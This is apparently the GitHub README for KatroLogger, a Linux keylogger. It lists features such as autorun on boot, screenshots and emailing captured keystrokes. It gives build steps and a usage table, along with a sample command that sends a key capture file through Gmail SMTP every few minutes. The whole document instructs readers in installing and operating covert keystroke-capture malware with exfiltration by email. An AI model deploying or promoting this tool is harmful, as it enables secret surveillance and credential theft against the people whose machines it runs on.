<p align="center">
  <a href="https://github.com/Katrovisch/KatroLogger">
    <img src="https://github.com/Katrovisch/KatroLogger/blob/master/static/img/logo.png">
  </a>
</p>

---

<h3 align="center"><code>KeyLogger for Linux Systems</code></h3>

### Features
  - Runs on GUI systems or CLI
  - Sending data by email
  - Autorun on boot
  - Screenshots

### Dependencies
- [libcurl](https://curl.se/libcurl/)
- [Cairo graphics library](https://www.cairographics.org/)
- [libquickmail](https://sourceforge.net/projects/libquickmail/)

Install libquickmail:
```Shell
wget https://ufpr.dl.sourceforge.net/project/libquickmail/libquickmail-0.1.29.tar.xz
```
```Shell
tar -xvf libquickmail-0.1.29.tar.xz
```
```Shell
./autogen.sh && ./configure && make && make install
```

### Install

```Shell
./configure && make && make install
```

### Usage

```Shell
katrologger --output /path/file
```
### Send data by e-mail

| Argument | Description | 
|---|---|
| --smtp-status | email sending status |
| --smtp-url | SMTP server |
| --smtps-url | SMTPS server |
| --port | SMTP port|
| --mail-from | source email |
| --pass | password email |
| --mail-rcpt | receipt email |
| --smtp-file | attach key capture file for sending |
| --update | update interval for sending email, 1-60 (minutes) |
| --screen | screenshots (:0 is display default) |


```Shell
katrologger --smtps-url smtp.gmail.com --port 465 --mail-from <address> --mail-rcpt <address> --pass <password> --smtp-file /path/keyscan --time 10
```

### Uninstall
```Shell
make uninstall
```

### License

KatroLogger is licensed under the [GNU General Public License v3.0](https://github.com/Katrovisch/KatroLogger/blob/master/LICENSE)
